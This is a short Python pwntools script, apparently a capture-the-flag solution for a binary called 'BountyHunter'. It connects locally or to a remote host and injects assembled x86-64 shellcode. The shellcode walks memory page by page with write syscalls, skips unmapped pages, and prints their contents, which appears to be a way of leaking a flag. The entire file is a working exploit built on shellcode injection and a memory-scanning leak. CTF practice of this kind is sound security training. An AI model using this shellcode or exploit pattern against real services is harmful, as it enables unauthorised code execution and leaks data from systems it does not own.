#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings
import ctypes

# Set up pwntools for the correct architecture
exe = context.binary = ELF('BountyHunter')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

filterwarnings("ignore")
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *main+180
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def solve():

    sc = asm(f"""
        clear:
            xor r10, r10
             
        loop:
             mov rax, 0x1
             mov rdi, 0x1
             mov rdx, 0x30
             add r10, 0x1000
             mov rsi, r10
             syscall
             cmp rax, -14
             je loop

    """)


    io.send(sc)

    io.interactive()


def main():
    
    init()
    solve()


if __name__ == '__main__':
    main()

